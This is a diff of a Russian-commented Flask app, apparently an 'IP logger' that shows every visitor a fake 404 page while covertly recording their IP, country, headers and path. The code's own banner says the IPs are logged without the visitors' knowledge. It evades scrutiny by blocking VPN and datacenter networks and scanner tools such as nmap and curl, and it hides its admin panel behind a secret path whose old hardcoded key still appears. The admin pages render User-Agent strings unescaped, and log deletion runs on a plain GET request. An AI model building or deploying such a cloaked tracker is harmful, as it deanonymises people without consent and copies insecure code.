@@ -3,43 +3,55 @@ from datetime import datetime
 import requests
 import json
 import os
-from functools import wraps
+import re
 
 app = Flask(__name__)
 
-# Конфигурация
-LOG_FILE = os.environ.get('LOG_FILE', 'visitors.log')  # Текстовый файл для логов
-BLOCKED_LOG_FILE = 'blocked_requests.log'  # Логи заблокированных
+# ============= КОНФИГУРАЦИЯ ИЗ ПЕРЕМЕННЫХ ОКРУЖЕНИЯ =============
+SECRET_KEY = os.environ.get('ADMIN_SECRET_KEY', None)
 ENABLE_VPN_BLOCK = os.environ.get('ENABLE_VPN_BLOCK', 'true').lower() == 'true'
+LOG_FILE = os.environ.get('LOG_FILE', 'visitors.log')
+BLOCKED_LOG_FILE = 'blocked_requests.log'
 
-# Список ASN дата-центров и хостингов
+# Проверка наличия секретного ключа
+if not SECRET_KEY:
+    print("=" * 60)
+    print("⚠️  ВНИМАНИЕ: ADMIN_SECRET_KEY не задан в переменных окружения!")
+    print("⚠️  Добавьте переменную ADMIN_SECRET_KEY в настройках Render")
+    print("⚠️  Использую временный ключ - ИЗМЕНИТЕ ЕГО!")
+    print("=" * 60)
+    SECRET_KEY = "CHANGE_ME_IN_RENDER_ENV"
+
+# ============= СПИСКИ ДЛЯ БЛОКИРОВКИ =============
 BLOCKED_ASNS = {
     'AS13335', 'AS16509', 'AS15169', 'AS8075', 'AS20473',
     'AS16276', 'AS14061', 'AS63949', 'AS14618', 'AS200019',
-    'AS36459', 'AS54113', 'AS20940',
+    'AS36459', 'AS54113', 'AS20940', 'AS60068', 'AS53850'
 }
 
-# Ключевые слова VPN/хостингов
 SUSPICIOUS_KEYWORDS = [
     'vpn', 'hosting', 'cloud', 'data center', 'proxy', 'server', 
     'virtual', 'dedicated', 'vps', 'colo', 'rack', 'host', 'cloudflare',
     'digitalocean', 'aws', 'amazon', 'azure', 'google cloud', 'linode',
-    'vultr', 'ovh', 'hetzner'
+    'vultr', 'ovh', 'hetzner', 'namecheap', 'godaddy', 'vpn', 'proxy'
 ]
 
-# Подозрительные User-Agent
 BLOCKED_USER_AGENTS = [
     'python-requests', 'curl', 'wget', 'go-http-client', 'java', 
     'perl', 'ruby', 'scrapy', 'httpx', 'aiohttp', 'okhttp',
-    'bot', 'crawler', 'spider', 'scanner'
+    'bot', 'crawler', 'spider', 'scanner', 'nmap', 'masscan',
+    'zgrab', 'httpie', 'rest-client', 'axios', 'node-fetch'
 ]
 
+# ============= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =============
 def get_real_ip():
     """Получает реальный IP клиента за прокси"""
     if request.headers.get('X-Forwarded-For'):
         return request.headers.get('X-Forwarded-For').split(',')[0].strip()
     if request.headers.get('X-Real-IP'):
         return request.headers.get('X-Real-IP')
+    if request.headers.get('CF-Connecting-IP'):
+        return request.headers.get('CF-Connecting-IP')
     return request.remote_addr
 
 def log_to_file(ip, status, details=""):
@@ -47,17 +59,24 @@ def log_to_file(ip, status, details=""):
     timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
     user_agent = request.headers.get('User-Agent', 'Unknown')
     path = request.path
+    method = request.method
     
-    log_entry = f"[{timestamp}] IP: {ip} | Status: {status} | Path: {path} | UA: {user_agent[:100]}"
+    # Получаем страну (если есть)
+    country = "Unknown"
+    try:
+        response = requests.get(f'http://ip-api.com/json/{ip}', timeout=2)
+        data = response.json()
+        if data.get('status') == 'success':
+            country = data.get('countryCode', 'Unknown')
+    except:
+        pass
+    
+    log_entry = f"[{timestamp}] {status} | IP: {ip} | Country: {country} | Method: {method} | Path: {path} | UA: {user_agent[:80]}"
     if details:
-        log_entry += f" | Details: {details}"
+        log_entry += f" | {details}"
     log_entry += "\n"
     
-    # Выбираем файл для записи
-    if status == "BLOCKED":
-        filename = BLOCKED_LOG_FILE
-    else:
-        filename = LOG_FILE
+    filename = BLOCKED_LOG_FILE if status == "BLOCKED" else LOG_FILE
     
     try:
         with open(filename, 'a', encoding='utf-8') as f:
@@ -70,7 +89,7 @@ def is_vpn_or_hosting(ip):
     if not ENABLE_VPN_BLOCK:
         return False, None
     
-    if ip.startswith(('127.', '192.168.', '10.', '172.')):
+    if ip.startswith(('127.', '192.168.', '10.', '172.', '169.254.')):
         return False, None
     
     try:
@@ -83,50 +102,91 @@ def is_vpn_or_hosting(ip):
             isp = data.get('isp', '').lower()
             
             if asn in BLOCKED_ASNS:
-                return True, f"Datacenter blocked (ASN: {asn})"
+                return True, f"Datacenter blocked (ASN: {asn}, ISP: {isp})"
             
             for keyword in SUSPICIOUS_KEYWORDS:
                 if keyword in org or keyword in isp:
-                    return True, f"VPN/Hosting detected: {org}"
+                    return True, f"VPN/Hosting detected: {org[:50]}"
         return False, None
-    except:
+    except requests.Timeout:
+        return False, None
+    except Exception as e:
+        print(f"Ошибка проверки IP {ip}: {e}")
         return False, None
 
 def check_user_agent():
     """Проверяет User-Agent на ботов"""
     user_agent = request.headers.get('User-Agent', '').lower()
+    
+    # Пустой User-Agent
+    if not user_agent or user_agent == 'unknown':
+        return True, "Empty User-Agent"
+    
+    # Слишком короткий UA
+    if len(user_agent) < 10:
+        return True, f"Too short User-Agent ({len(user_agent)} chars)"
+    
     for bot in BLOCKED_USER_AGENTS:
         if bot in user_agent:
             return True, f"Bot detected: {bot}"
-    if not user_agent:
-        return True, "Missing User-Agent"
+    
     return False, None
 
+def check_missing_headers():
+    """Проверяет наличие обязательных браузерных заголовков"""
+    # Браузеры всегда отправляют Accept
+    if not request.headers.get('Accept'):
+        return True, "Missing Accept header"
+    
+    # Браузеры всегда отправляют Accept-Language
+    if not request.headers.get('Accept-Language'):
+        return True, "Missing Accept-Language header"
+    
+    # Браузеры всегда отправляют Connection
+    if not request.headers.get('Connection'):
+        return True, "Missing Connection header"
+    
+    return False, None
+
+# ============= ОСНОВНАЯ ПРОВЕРКА =============
 @app.before_request
 def security_check():
     """Проверка безопасности и логгирование"""
+    # Пропускаем health check и статические файлы
+    if request.path in ['/health', '/robots.txt', '/favicon.ico']:
+        return None
+    
+    # Пропускаем админские маршруты
+    if request.path.startswith(f'/{SECRET_KEY}'):
+        return None
+    
     client_ip = get_real_ip()
     
-    # Проверка на ботов
+    # Проверка на отсутствие браузерных заголовков
+    is_missing, missing_reason = check_missing_headers()
+    if is_missing:
+        log_to_file(client_ip, "BLOCKED", missing_reason)
+        abort(404)
+    
+    # Проверка User-Agent
     is_bot, bot_reason = check_user_agent()
     if is_bot:
         log_to_file(client_ip, "BLOCKED", bot_reason)
-        abort(404)  # Возвращаем 404 вместо страницы блокировки
+        abort(404)
     
     # Проверка на VPN
     is_vpn, vpn_reason = is_vpn_or_hosting(client_ip)
     if is_vpn:
         log_to_file(client_ip, "BLOCKED", vpn_reason)
-        abort(404)  # Возвращаем 404 вместо страницы блокировки
+        abort(404)
     
     # Логгируем успешный запрос
     log_to_file(client_ip, "VISITED")
     
-    # Всегда возвращаем 404 для всех путей
-    # (кроме специальных админских, если нужно)
-    if request.path not in ['/admin', '/stats', '/logs']:
-        abort(404)
+    # Всегда возвращаем 404 для всех обычных путей
+    abort(404)
 
+# ============= СТРАНИЦА 404 =============
 @app.errorhandler(404)
 def page_not_found(e):
     """Страница 404 для всех посетителей"""
@@ -137,59 +197,237 @@ def page_not_found(e):
         <meta charset="utf-8">
         <title>404 - Page Not Found</title>
         <style>
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
             body {
-                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-                background: #1a1a1a;
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+                background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
                 min-height: 100vh;
                 display: flex;
                 justify-content: center;
                 align-items: center;
-                margin: 0;
                 padding: 20px;
             }
             .container {
                 text-align: center;
-                color: #fff;
+                max-width: 600px;
+                animation: fadeIn 0.5s ease-out;
+            }
+            @keyframes fadeIn {
+                from {
+                    opacity: 0;
+                    transform: translateY(-20px);
+                }
+                to {
+                    opacity: 1;
+                    transform: translateY(0);
+                }
             }
             h1 {
                 font-size: 120px;
+                font-weight: 700;
                 margin: 0;
-                color: #e74c3c;
-                text-shadow: 4px 4px 0px #c0392b;
+                background: linear-gradient(135deg, #e74c3c, #c0392b);
+                -webkit-background-clip: text;
+                -webkit-text-fill-color: transparent;
+                background-clip: text;
+                text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+            }
+            .glitch {
+                font-size: 120px;
+                font-weight: 700;
+                position: relative;
+                margin: 0;
             }
             p {
-                font-size: 20px;
+                font-size: 18px;
                 color: #888;
+                margin: 20px 0;
+                line-height: 1.6;
             }
             .error-code {
-                font-family: monospace;
+                font-family: 'Courier New', monospace;
                 color: #555;
-                margin-top: 20px;
+                margin-top: 30px;
+                font-size: 14px;
+                border-top: 1px solid #333;
+                padding-top: 20px;
+                display: inline-block;
+            }
+            @media (max-width: 768px) {
+                h1 { font-size: 80px; }
+                .glitch { font-size: 80px; }
+                p { font-size: 14px; }
             }
         </style>
     </head>
     <body>
         <div class="container">
-            <h1>404</h1>
-            <p>Page not found</p>
-            <div class="error-code">ERROR_404</div>
+            <div class="glitch">
+                <h1>404</h1>
+            </div>
+            <p>
+                The page you are looking for<br>
+                does not exist or has been moved.
+            </p>
+            <div class="error-code">
+                ERROR_404_NOT_FOUND
+            </div>
         </div>
     </body>
     </html>
     """, 404
 
-# ============= АДМИНСКИЕ МАРШРУТЫ (скрытые, для просмотра логов) =============
-# ВНИМАНИЕ: Эти страницы доступны только если знать секретный путь!
-# Измените "admin123" на свой секретный ключ
-
-SECRET_KEY = "iPlo-Gg-in-N-gJoS123"  # ИЗМЕНИТЕ ЭТО НА СВОЙ СЕКРЕТНЫЙ КЛЮЧ!
+# ============= АДМИНСКИЕ МАРШРУТЫ (СКРЫТЫЕ) =============
+@app.route(f'/{SECRET_KEY}')
+def admin_panel():
+    """Скрытая админ-панель"""
+    return f"""
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="utf-8">
+        <title>Admin Panel - IP Logger</title>
+        <style>
+            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+            body {{
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+                background: #1e1e1e;
+                min-height: 100vh;
+                padding: 40px 20px;
+            }}
+            .container {{
+                max-width: 800px;
+                margin: 0 auto;
+            }}
+            h1 {{
+                color: #4ec9b0;
+                margin-bottom: 30px;
+                text-align: center;
+                font-size: 2.5em;
+            }}
+            .menu {{
+                display: grid;
+                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+                gap: 20px;
+                margin-bottom: 30px;
+            }}
+            .card {{
+                background: #2d2d30;
+                border-radius: 10px;
+                padding: 30px;
+                text-align: center;
+                transition: transform 0.2s, box-shadow 0.2s;
+                cursor: pointer;
+            }}
+            .card:hover {{
+                transform: translateY(-5px);
+                box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            }}
+            .card-icon {{
+                font-size: 48px;
+                margin-bottom: 15px;
+            }}
+            .card-title {{
+                color: #fff;
+                font-size: 18px;
+                font-weight: 600;
+                margin-bottom: 10px;
+            }}
+            .card-desc {{
+                color: #888;
+                font-size: 14px;
+            }}
+            a {{
+                text-decoration: none;
+            }}
+            .stats {{
+                background: #2d2d30;
+                border-radius: 10px;
+                padding: 20px;
+                margin-top: 20px;
+            }}
+            .stats h3 {{
+                color: #4ec9b0;
+                margin-bottom: 15px;
+            }}
+            .stat-item {{
+                display: flex;
+                justify-content: space-between;
+                padding: 10px 0;
+                border-bottom: 1px solid #3e3e42;
+                color: #d4d4d4;
+            }}
+            .stat-item:last-child {{
+                border-bottom: none;
+            }}
+            .stat-label {{
+                font-weight: 600;
+            }}
+            .stat-value {{
+                font-family: monospace;
+                color: #4ec9b0;
+            }}
+            .footer {{
+                text-align: center;
+                margin-top: 30px;
+                color: #555;
+                font-size: 12px;
+            }}
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>🔐 Admin Dashboard</h1>
+            <div class="menu">
+                <a href="/{SECRET_KEY}/logs">
+                    <div class="card">
+                        <div class="card-icon">📋</div>
+                        <div class="card-title">View Logs</div>
+                        <div class="card-desc">All visitor records</div>
+                    </div>
+                </a>
+                <a href="/{SECRET_KEY}/stats">
+                    <div class="card">
+                        <div class="card-icon">📊</div>
+                        <div class="card-title">Statistics</div>
+                        <div class="card-desc">Analytics & metrics</div>
+                    </div>
+                </a>
+                <a href="/{SECRET_KEY}/blocked">
+                    <div class="card">
+                        <div class="card-icon">🚫</div>
+                        <div class="card-title">Blocked</div>
+                        <div class="card-desc">VPN & bot attempts</div>
+                    </div>
+                </a>
+                <a href="/{SECRET_KEY}/clear" onclick="return confirm('Are you sure? This will delete ALL logs!')">
+                    <div class="card">
+                        <div class="card-icon">🗑️</div>
+                        <div class="card-title">Clear Logs</div>
+                        <div class="card-desc">Delete all records</div>
+                    </div>
+                </a>
+            </div>
+            <div class="footer">
+                🔒 Secure access | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+            </div>
+        </div>
+    </body>
+    </html>
+    """
 
 @app.route(f'/{SECRET_KEY}/logs')
 def view_logs():
-    """Просмотр всех логов (скрытая страница)"""
+    """Просмотр всех логов"""
     try:
         with open(LOG_FILE, 'r', encoding='utf-8') as f:
             logs = f.read()
+        
+        total_lines = len([l for l in logs.split('\n') if l.strip()]) if logs else 0
         
         return f"""
         <!DOCTYPE html>
@@ -198,70 +436,83 @@ def view_logs():
             <meta charset="utf-8">
             <title>Logs - IP Logger</title>
             <style>
-                body {{ font-family: monospace; margin: 20px; background: #1e1e1e; color: #d4d4d4; }}
-                h1 {{ color: #4ec9b0; }}
-                pre {{ background: #252526; padding: 20px; border-radius: 5px; overflow-x: auto; }}
-                .stats {{ background: #2d2d30; padding: 15px; border-radius: 5px; margin-bottom: 20px; }}
+                body {{ font-family: 'Courier New', monospace; margin: 0; background: #1e1e1e; color: #d4d4d4; }}
+                .header {{ background: #2d2d30; padding: 20px; border-bottom: 1px solid #3e3e42; }}
+                h1 {{ color: #4ec9b0; margin: 0; }}
+                .stats {{ color: #888; margin-top: 10px; }}
+                .content {{ padding: 20px; }}
+                pre {{ background: #252526; padding: 20px; border-radius: 5px; overflow-x: auto; margin: 0; }}
                 .button {{
                     display: inline-block;
                     background: #0e639c;
                     color: white;
                     text-decoration: none;
-                    padding: 10px 20px;
-                    border-radius: 5px;
-                    margin: 10px 5px;
+                    padding: 8px 16px;
+                    border-radius: 4px;
+                    margin-right: 10px;
                 }}
                 .button:hover {{ background: #1177bb; }}
+                .nav {{ margin-bottom: 20px; }}
             </style>
         </head>
         <body>
-            <h1>📋 Visitor Logs</h1>
-            <div class="stats">
-                <strong>Total entries:</strong> {len(logs.strip().split(chr(10))) if logs else 0}
+            <div class="header">
+                <h1>📋 Visitor Logs</h1>
+                <div class="stats">Total entries: {total_lines}</div>
             </div>
-            <div style="margin: 20px 0;">
-                <a href="/{SECRET_KEY}/stats" class="button">📊 Statistics</a>
-                <a href="/{SECRET_KEY}/blocked" class="button">🚫 Blocked</a>
-                <a href="/{SECRET_KEY}/clear" class="button" onclick="return confirm('Clear all logs?')">🗑️ Clear Logs</a>
+            <div class="content">
+                <div class="nav">
+                    <a href="/{SECRET_KEY}" class="button">← Back to Admin</a>
+                    <a href="/{SECRET_KEY}/stats" class="button">📊 Statistics</a>
+                    <a href="/{SECRET_KEY}/blocked" class="button">🚫 Blocked</a>
+                </div>
+                <pre>{logs if logs else "No logs yet. Visitors will appear here when they visit the site."}</pre>
             </div>
-            <pre>{logs if logs else "No logs yet"}</pre>
         </body>
         </html>
         """
     except FileNotFoundError:
-        return "No logs yet"
+        return f"""
+        <html>
+        <body style="background: #1e1e1e; color: #d4d4d4; font-family: monospace; padding: 20px;">
+            <h1>📋 Logs</h1>
+            <p>No logs yet. Visitors will appear here when they visit the site.</p>
+            <a href="/{SECRET_KEY}" class="button">← Back</a>
+        </body>
+        </html>
+        """
 
 @app.route(f'/{SECRET_KEY}/stats')
 def view_stats():
-    """Статистика посещений (скрытая страница)"""
+    """Статистика посещений"""
     try:
         with open(LOG_FILE, 'r', encoding='utf-8') as f:
             lines = f.readlines()
         
         # Парсим логи
         ips = {}
+        countries = {}
         dates = {}
         user_agents = {}
         
         for line in lines:
-            if 'IP:' in line and 'VISITED' in line:
+            if 'VISITED' in line:
                 # Извлекаем IP
-                ip_start = line.find('IP:') + 4
-                ip_end = line.find(' |', ip_start)
-                if ip_end == -1:
-                    ip_end = len(line)
-                ip = line[ip_start:ip_end].strip()
-                ips[ip] = ips.get(ip, 0) + 1
+                ip_match = re.search(r'IP: ([\d\.]+)', line)
+                if ip_match:
+                    ip = ip_match.group(1)
+                    ips[ip] = ips.get(ip, 0) + 1
+                
+                # Извлекаем страну
+                country_match = re.search(r'Country: (\w+)', line)
+                if country_match:
+                    country = country_match.group(1)
+                    countries[country] = countries.get(country, 0) + 1
                 
                 # Извлекаем дату
-                date = line[1:11] if len(line) > 10 else "Unknown"
-                dates[date] = dates.get(date, 0) + 1
-                
-                # Извлекаем User-Agent
-                ua_start = line.find('UA:') + 4
-                if ua_start > 4:
-                    ua = line[ua_start:].strip()[:50]
-                    user_agents[ua] = user_agents.get(ua, 0) + 1
+                if line.startswith('['):
+                    date = line[1:11]
+                    dates[date] = dates.get(date, 0) + 1
         
         total_visits = len([l for l in lines if 'VISITED' in l])
         unique_ips = len(ips)
@@ -273,17 +524,19 @@ def view_stats():
             <meta charset="utf-8">
             <title>Statistics - IP Logger</title>
             <style>
-                body {{ font-family: Arial, sans-serif; margin: 20px; background: #1e1e1e; color: #d4d4d4; }}
-                h1 {{ color: #4ec9b0; }}
+                body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; background: #1e1e1e; color: #d4d4d4; }}
+                .header {{ background: #2d2d30; padding: 20px; border-bottom: 1px solid #3e3e42; }}
+                h1 {{ color: #4ec9b0; margin: 0; }}
+                .content {{ padding: 20px; max-width: 1200px; margin: 0 auto; }}
                 .stats-grid {{
                     display: grid;
-                    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                     gap: 20px;
-                    margin: 20px 0;
+                    margin: 30px 0;
                 }}
                 .stat-card {{
                     background: #2d2d30;
-                    padding: 20px;
+                    padding: 25px;
                     border-radius: 10px;
                     text-align: center;
                 }}
@@ -302,7 +555,7 @@ def view_stats():
                     margin: 20px 0;
                 }}
                 th, td {{
-                    padding: 10px;
+                    padding: 12px;
                     text-align: left;
                     border-bottom: 1px solid #3e3e42;
                 }}
@@ -315,52 +568,61 @@ def view_stats():
                     background: #0e639c;
                     color: white;
                     text-decoration: none;
-                    padding: 10px 20px;
-                    border-radius: 5px;
-                    margin: 10px 5px;
+                    padding: 8px 16px;
+                    border-radius: 4px;
+                    margin-right: 10px;
                 }}
                 .button:hover {{ background: #1177bb; }}
             </style>
         </head>
         <body>
-            <h1>📊 Statistics</h1>
-            
-            <div class="stats-grid">
-                <div class="stat-card">
-                    <div class="stat-number">{total_visits}</div>
-                    <div class="stat-label">Total Visits</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-number">{unique_ips}</div>
-                    <div class="stat-label">Unique IPs</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-number">{len(dates)}</div>
-                    <div class="stat-label">Days</div>
-                </div>
+            <div class="header">
+                <h1>📊 Statistics</h1>
             </div>
-            
-            <h3>🌍 Top IPs</h3>
-            <table>
-                <tr><th>IP Address</th><th>Visits</th></tr>
-                {''.join(f'<tr><td><code>{ip}</code></td><td>{count}</td></tr>' for ip, count in sorted(ips.items(), key=lambda x: x[1], reverse=True)[:10])}
-            </table>
-            
-            <h3>📅 Visits by Day</h3>
-            <table>
-                <tr><th>Date</th><th>Visits</th></tr>
-                {''.join(f'<tr><td>{date}</td><td>{count}</td></tr>' for date, count in sorted(dates.items(), reverse=True)[:10])}
-            </table>
-            
-            <div style="margin-top: 30px;">
-                <a href="/{SECRET_KEY}/logs" class="button">← Back to Logs</a>
-                <a href="/{SECRET_KEY}/blocked" class="button">🚫 View Blocked</a>
+            <div class="content">
+                <div style="margin-bottom: 20px;">
+                    <a href="/{SECRET_KEY}" class="button">← Back to Admin</a>
+                    <a href="/{SECRET_KEY}/logs" class="button">📋 View Logs</a>
+                </div>
+                
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-number">{total_visits}</div>
+                        <div class="stat-label">Total Visits</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">{unique_ips}</div>
+                        <div class="stat-label">Unique IPs</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">{len(dates)}</div>
+                        <div class="stat-label">Days Active</div>
+                    </div>
+                </div>
+                
+                <h3>🌍 Top Countries</h3>
+                <table>
+                    <tr><th>Country</th><th>Visits</th></tr>
+                    {''.join(f'<tr><td>{c if c != "Unknown" else "❓ Unknown"}</td><td>{cnt}</td></tr>' for c, cnt in sorted(countries.items(), key=lambda x: x[1], reverse=True)[:10])}
+                </table>
+                
+                <h3>🔝 Top IPs</h3>
+                <table>
+                    <tr><th>IP Address</th><th>Visits</th></tr>
+                    {''.join(f'<tr><td><code>{ip}</code></td><td>{cnt}</td></tr>' for ip, cnt in sorted(ips.items(), key=lambda x: x[1], reverse=True)[:10])}
+                </table>
+                
+                <h3>📅 Recent Activity</h3>
+                <table>
+                    <tr><th>Date</th><th>Visits</th></tr>
+                    {''.join(f'<tr><td>{date}</td><td>{cnt}</td></tr>' for date, cnt in sorted(dates.items(), reverse=True)[:10])}
+                </table>
             </div>
         </body>
         </html>
         """
     except Exception as e:
-        return f"Error: {e}"
+        return f"Error loading statistics: {e}"
 
 @app.route(f'/{SECRET_KEY}/blocked')
 def view_blocked():
@@ -369,6 +631,8 @@ def view_blocked():
         with open(BLOCKED_LOG_FILE, 'r', encoding='utf-8') as f:
             blocked = f.read()
         
+        total_blocked = len([l for l in blocked.split('\n') if l.strip()]) if blocked else 0
+        
         return f"""
         <!DOCTYPE html>
         <html>
@@ -376,29 +640,45 @@ def view_blocked():
             <meta charset="utf-8">
             <title>Blocked - IP Logger</title>
             <style>
-                body {{ font-family: monospace; margin: 20px; background: #1e1e1e; color: #d4d4d4; }}
-                h1 {{ color: #f48771; }}
+                body {{ font-family: 'Courier New', monospace; margin: 0; background: #1e1e1e; color: #d4d4d4; }}
+                .header {{ background: #2d2d30; padding: 20px; border-bottom: 1px solid #3e3e42; }}
+                h1 {{ color: #f48771; margin: 0; }}
+                .stats {{ color: #888; margin-top: 10px; }}
+                .content {{ padding: 20px; }}
                 pre {{ background: #252526; padding: 20px; border-radius: 5px; overflow-x: auto; }}
                 .button {{
                     display: inline-block;
                     background: #0e639c;
                     color: white;
                     text-decoration: none;
-                    padding: 10px 20px;
-                    border-radius: 5px;
-                    margin: 10px 5px;
+                    padding: 8px 16px;
+                    border-radius: 4px;
+                    margin-right: 10px;
                 }}
             </style>
         </head>
         <body>
-            <h1>🚫 Blocked Requests</h1>
-            <pre>{blocked if blocked else "No blocked requests"}</pre>
-            <a href="/{SECRET_KEY}/logs" class="button">← Back</a>
+            <div class="header">
+                <h1>🚫 Blocked Requests</h1>
+                <div class="stats">Total blocked: {total_blocked}</div>
+            </div>
+            <div class="content">
+                <a href="/{SECRET_KEY}" class="button">← Back to Admin</a>
+                <pre>{blocked if blocked else "No blocked requests yet. VPN and bots will appear here."}</pre>
+            </div>
         </body>
         </html>
         """
-    except:
-        return "No blocked requests"
+    except FileNotFoundError:
+        return f"""
+        <html>
+        <body style="background: #1e1e1e; color: #d4d4d4; font-family: monospace; padding: 20px;">
+            <h1>🚫 Blocked Requests</h1>
+            <p>No blocked requests yet.</p>
+            <a href="/{SECRET_KEY}" class="button">← Back</a>
+        </body>
+        </html>
+        """
 
 @app.route(f'/{SECRET_KEY}/clear')
 def clear_logs():
@@ -406,57 +686,36 @@ def clear_logs():
     try:
         open(LOG_FILE, 'w').close()
         open(BLOCKED_LOG_FILE, 'w').close()
-        return "Logs cleared! <a href='/{}'>Back</a>".format(SECRET_KEY)
-    except:
-        return "Error clearing logs"
+        return f"""
+        <html>
+        <body style="background: #1e1e1e; color: #d4d4d4; font-family: monospace; padding: 20px;">
+            <h1>✅ Logs Cleared</h1>
+            <p>All log files have been cleared successfully.</p>
+            <a href="/{SECRET_KEY}" class="button">← Back to Admin</a>
+        </body>
+        </html>
+        """
+    except Exception as e:
+        return f"Error clearing logs: {e}"
 
-@app.route(f'/{SECRET_KEY}')
-def admin_panel():
-    """Скрытая админ-панель"""
-    return f"""
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <meta charset="utf-8">
-        <title>Admin Panel</title>
-        <style>
-            body {{ font-family: Arial, sans-serif; margin: 40px; background: #1e1e1e; color: #d4d4d4; }}
-            .container {{ max-width: 600px; margin: 0 auto; text-align: center; }}
-            h1 {{ color: #4ec9b0; }}
-            .menu {{ margin: 30px 0; }}
-            .button {{
-                display: block;
-                background: #0e639c;
-                color: white;
-                text-decoration: none;
-                padding: 15px;
-                margin: 10px 0;
-                border-radius: 5px;
-            }}
-            .button:hover {{ background: #1177bb; }}
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <h1>🔐 Admin Panel</h1>
-            <div class="menu">
-                <a href="/{SECRET_KEY}/logs" class="button">📋 View All Logs</a>
-                <a href="/{SECRET_KEY}/stats" class="button">📊 Statistics</a>
-                <a href="/{SECRET_KEY}/blocked" class="button">🚫 Blocked Requests</a>
-            </div>
-        </div>
-    </body>
-    </html>
-    """
-
-# Health check для Render
+# ============= HEALTH CHECK ДЛЯ RENDER =============
 @app.route('/health')
 def health():
-    return {"status": "healthy"}, 200
+    """Health check endpoint для Render"""
+    return {"status": "healthy", "timestamp": datetime.now().isoformat()}, 200
 
+# ============= ЗАПУСК ПРИЛОЖЕНИЯ =============
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    print(f"Server running on port {port}")
-    print(f"Admin panel: http://localhost:{port}/{SECRET_KEY}")
-    print(f"Logs are saved to: {LOG_FILE}")
+    print("=" * 60)
+    print("🚀 IP Logger Server Started")
+    print("=" * 60)
+    print(f"📍 Port: {port}")
+    print(f"🔐 Admin Panel: /{SECRET_KEY}")
+    print(f"📝 Log file: {LOG_FILE}")
+    print(f"🚫 VPN Block: {ENABLE_VPN_BLOCK}")
+    print("=" * 60)
+    print("⚠️  All visitors will see 404 error")
+    print("⚠️  IPs are logged without their knowledge")
+    print("=" * 60)
     app.run(host='0.0.0.0', port=port, debug=False)
